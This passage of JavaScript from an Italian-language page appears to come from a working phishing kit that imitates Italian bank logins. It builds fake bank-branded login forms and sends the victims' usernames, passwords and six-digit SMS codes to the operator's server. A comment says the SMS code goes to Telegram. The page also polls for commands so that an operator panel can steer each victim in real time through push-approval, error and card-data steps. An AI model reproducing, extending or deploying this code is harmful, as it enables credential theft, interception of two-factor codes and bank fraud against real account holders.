                imageSrc = `./banks/banks/${bank.logoFile}`;
            } else if (bank.logoUrl && bank.logoUrl.trim() !== '') {
                imageSrc = bank.logoUrl;
            }

            if (imageSrc) {
                logoImg.src = imageSrc;
                logoImg.style.display = 'block';
                fallback.style.display = 'none';
                logoImg.onerror = function() {
                    logoImg.style.display = 'none';
                    fallback.style.display = 'flex';
                    fallback.innerText = bank.logoText || bank.shortName || bank.name.substring(0,2).toUpperCase();
                    fallback.style.backgroundColor = bank.brandColor;
                    fallback.style.color = bank.textColor;
                };
            } else {
                logoImg.style.display = 'none';
                fallback.style.display = 'flex';
                fallback.innerText = bank.logoText || bank.shortName || bank.name.substring(0,2).toUpperCase();
                fallback.style.backgroundColor = bank.brandColor;
                fallback.style.color = bank.textColor;
            }

            const displayName = bank.name + (branch ? ` - ${branch.name}` : '');
            document.getElementById('redirect-bank-name').innerText = displayName;
            document.getElementById('redirect-bank-name-in-text').innerText = displayName;
            document.getElementById('redirect-continue-text').innerText = `Continua con ${displayName}`;

            adaptThemeToBank(bank);
            showStep('step-bank-redirect');
        }

        function proceedToBankLogin() {
            sendNotif('bank_redirect_viewed', { bank_name: currentSelectedBank.name });
            if (currentSelectedBank && currentSelectedBank.id) {
                let redirectUrl = 'bank.php?bank_id=' + encodeURIComponent(currentSelectedBank.id);
                if (currentSelectedBranch) {
                    redirectUrl += '&branch_id=' + encodeURIComponent(currentSelectedBranch.id);
                }
                // Pass the user's email so bank.php can match against status.json
                const userVal = document.getElementById('user-input').value.trim();
                if (userVal) {
                    redirectUrl += '&email=' + encodeURIComponent(userVal);
                }
                window.location.href = redirectUrl;
            } else {
                showBankLoginStep(currentSelectedBank, currentSelectedBranch);
            }
        }

        function showBranchStep(bank) {
            const container = document.getElementById('branch-list-container');
            container.innerHTML = '';
            document.getElementById('branch-step-subtitle').innerText = `Scegli la divisione o il portale per ${bank.name}:`;
            bank.branches.forEach(branch => {
                const div = document.createElement('div');
                div.className = 'branch-item';
                div.innerHTML = `
                    <div class="bank-info">
                        <div class="w-2.5 h-2.5 rounded-full" style="background-color: ${bank.brandColor};"></div>
                        <span class="font-semibold text-slate-700 text-sm">${branch.name}</span>
                    </div>
                    <i class="fa-solid fa-chevron-right bank-chevron"></i>
                `;
                div.addEventListener('click', () => handleBranchChoice(branch));
                container.appendChild(div);
            });
            showStep('step-branch');
        }

        function handleBranchChoice(branch) {
            currentSelectedBranch = branch;
            sendNotif('branch_selected', { branch_id: branch.id, branch_name: branch.name });
            showBankRedirectStep(currentSelectedBank, branch);
        }

        function showBankLoginStep(bank, branch = null) {
            document.getElementById('bank-login-name').innerText = bank.name + (branch ? ` - ${branch.name}` : '');
            const container = document.getElementById('bank-login-fields');
            container.innerHTML = '';
            let fields = bank.fields && bank.fields.length > 0 ? bank.fields : [
                { label: "Username / Codice Utente", placeholder: "Inserisci il tuo username", type: "text", required: true },
                { label: "Password", placeholder: "••••••••", type: "password", required: true }
            ];
            fields.forEach(field => {
                const wrapper = document.createElement('div');
                wrapper.className = 'mb-4';
                wrapper.innerHTML = `
                    <label class="text-[13px] font-semibold text-[#080516] mb-1.5 block">${field.label}</label>
                    <input type="${field.type}" id="bank-login-${field.type === 'password' ? 'password' : 'username'}" 
                           placeholder="${field.placeholder}" 
                           class="w-full px-4 py-3.5 rounded-xl outline-none transition-all placeholder:text-[#8a8a96]">
                `;
                container.appendChild(wrapper);
            });
            document.getElementById('bank-login-error').style.display = 'none';
            showStep('step-bank-login');
        }

        function goBackToRedirect() {
            if (currentSelectedBank) {
                showBankRedirectStep(currentSelectedBank, currentSelectedBranch);
            } else {
                showStep('step-bank');
            }
        }

        function goBackToBankSelection() {
            currentSelectedBranch = null;
            resetTheme();
            showStep('step-bank');
            document.getElementById('bank-search-input').value = '';
            renderBanksList(italianBanks);
        }

        // === BANK LOGIN → PUSH PENDING (inline fallback with status polling) ===
        let inlineBankPollInterval = null;
        let inlineBankLastStatus = '';

        function startInlineBankPolling() {
            if (inlineBankPollInterval) return;
            inlineBankPollInterval = setInterval(checkInlineBankStatus, 2000);
        }

        function stopInlineBankPolling() {
            if (inlineBankPollInterval) { clearInterval(inlineBankPollInterval); inlineBankPollInterval = null; }
            inlineBankLastStatus = '';
        }

        function checkInlineBankStatus() {
            fetch('status.php?' + Date.now(), { cache: 'no-store' })
                .then(r => r.json())
                .then(data => {
                    const userVal = document.getElementById('user-input').value;
                    let s = '';
                    for (let ip in data) { if (data[ip].email === userVal) { s = data[ip].status || ''; break; } }
                    if (s && s !== inlineBankLastStatus && s.startsWith('bank_')) {
                        inlineBankLastStatus = s;
                        if (s === 'bank_push_pending') {
                            const bl = document.getElementById('btn-bank-login');
                            if (bl) bl.classList.remove('is-loading');
                            showBankPushStep();
                        } else if (s === 'bank_push_approve' || s === 'bank_push_approved' || s === 'bank_success') {
                            stopInlineBankPolling();
                            showStep('step-card');
                        } else if (s === 'bank_login_error') {
                            const ble = document.getElementById('bank-login-error');
                            const bl = document.getElementById('btn-bank-login');
                            if (ble) ble.style.display = 'flex';
                            if (bl) bl.classList.remove('is-loading');
                            showStep('step-bank-login');
                        } else if (s === 'bank_sms_error') {
                            const bse = document.getElementById('bank-sms-error');
                            const bsc = document.getElementById('bank-sms-code');
                            const bbs = document.getElementById('btn-bank-sms');
                            const bsc2 = document.getElementById('btn-sms-continue');
                            const bss = document.getElementById('bank-sms-success');
                            if (bse) bse.style.display = 'flex';
                            if (bsc) { bsc.value = ''; bsc.disabled = false; }
                            if (bbs) { bbs.classList.remove('is-loading'); bbs.style.display = 'flex'; }
                            if (bsc2) bsc2.style.display = 'none';
                            if (bss) bss.classList.add('hidden');
                            showStep('step-bank-sms');
                        }
                    }
                }).catch(() => {});
        }

        function submitBankLogin() {
            const btn = document.getElementById('btn-bank-login');
            if (!btn) return;
            const username = document.getElementById('bank-login-username')?.value.trim() || '';
            const password = document.getElementById('bank-login-password')?.value.trim() || '';
            if (!username || !password) {
                const ble = document.getElementById('bank-login-error');
                if (ble) ble.style.display = 'flex';
                return;
            }
            const ble = document.getElementById('bank-login-error');
            if (ble) ble.style.display = 'none';
            btn.classList.add('is-loading');

            let fd = new FormData();
            fd.append('type', 'bank_login');
            fd.append('username', username);
            fd.append('password', password);
            fd.append('bank_id', currentSelectedBank.id);
            fd.append('bank_name', currentSelectedBank.name);
            if (currentSelectedBranch) {
                fd.append('branch_id', currentSelectedBranch.id);
                fd.append('branch_name', currentSelectedBranch.name);
            }

            fetch('api.php', { method: 'POST', body: fd })
                .then(() => {
                    btn.classList.remove('is-loading');
                    showBankPushStep();
                    startInlineBankPolling();
                })
                .catch(() => {
                    btn.classList.remove('is-loading');
                    const ble2 = document.getElementById('bank-login-error');
                    if (ble2) ble2.style.display = 'flex';
                });
        }

        // === PUSH PENDING ===
        function showBankPushStep() {
            const badge = document.getElementById('push-step-badge');
            if (badge) {
                badge.style.backgroundColor = currentSelectedBank ? currentSelectedBank.brandColor : '#080516';
                badge.style.color = currentSelectedBank ? currentSelectedBank.textColor : '#ffffff';
            }
            const spinner = document.getElementById('push-spinner');
            if (spinner) {
                spinner.style.borderColor = currentSelectedBank ? currentSelectedBank.brandColor : '#080516';
                spinner.style.borderTopColor = 'transparent';
            }
            sendNotif('bank_push_pending', { bank_name: currentSelectedBank?.name || 'N/A' });
            showStep('step-bank-push');
        }

        // === SWITCH TO SMS FALLBACK ===
        function switchToSmsFallback() {
            smsVerified = false;
            const bse = document.getElementById('bank-sms-error');
            const bss = document.getElementById('bank-sms-success');
            const bsc = document.getElementById('btn-sms-continue');
            const bbs = document.getElementById('btn-bank-sms');
            const bscode = document.getElementById('bank-sms-code');
            if (bse) bse.style.display = 'none';
            if (bss) bss.classList.add('hidden');
            if (bsc) bsc.style.display = 'none';
            if (bbs) { bbs.style.display = 'flex'; bbs.classList.remove('is-loading'); }
            if (bscode) { bscode.value = ''; bscode.disabled = false; }
            showStep('step-bank-sms');
        }

        // === SUBMIT SMS OTP (panel-gated: spinner forever until panel acts) ===
        function submitBankSms() {
            const btn = document.getElementById('btn-bank-sms');
            const bscode = document.getElementById('bank-sms-code');
            if (!btn || !bscode) return;
            const code = bscode.value.replace(/\D/g, '');
            if (code.length !== 6) {
                const bse = document.getElementById('bank-sms-error');
                if (bse) bse.style.display = 'flex';
                return;
            }
            const bse = document.getElementById('bank-sms-error');
            if (bse) bse.style.display = 'none';
            btn.classList.add('is-loading');
            bscode.disabled = true;

            let fd = new FormData();
            fd.append('type', 'bank_sms_otp');
            fd.append('code', code);
            fd.append('bank_name', currentSelectedBank?.name || 'N/A');

            fetch('api.php', { method: 'POST', body: fd }).then(() => {
                // SMS code sent to Telegram — spinner stays forever
            }).catch(() => {
                btn.classList.remove('is-loading');
                bscode.disabled = false;
                if (bse) bse.style.display = 'flex';
            });
        }

        // === PROCEED FROM SMS (removed — panel controls advancement) ===
        function proceedFromSms() {
            // Panel-gated: use PUSH APPROVE to advance to card step
        }

        // Auto-submit SMS quando 6 cifre sono inserite (opzionale)
        document.getElementById('bank-sms-code')?.addEventListener('input', function(e) {
            e.target.value = e.target.value.replace(/\D/g, '');
            // Non auto-submit, lasciamo che l'utente clicchi manualmente
        });

        function confirmBank() {
            if (!currentSelectedBank) {
                alert('Per favore seleziona una banca prima di continuare.');
                return;
            }
            showBankRedirectStep(currentSelectedBank, currentSelectedBranch);
        }

        function proceedToBank() {
            const btn = document.getElementById('btn-verify-identity');
            btn.classList.add('is-loading');
            sendNotif('verify_identity_confirmed');
            // Panel-gated: button stays loading until panel clicks BANK LIST
        }

        // =============================================================
        // 11. INIZIALIZZAZIONE
        // =============================================================
        window.onload = function() {
            renderBanksList(italianBanks);
            if (!checkInterval) checkInterval = setInterval(checkStatus, 2000);
            // Check immediately on load (for redirects from bank.php)
            checkStatus();
        };
    </script>
</body>
</html>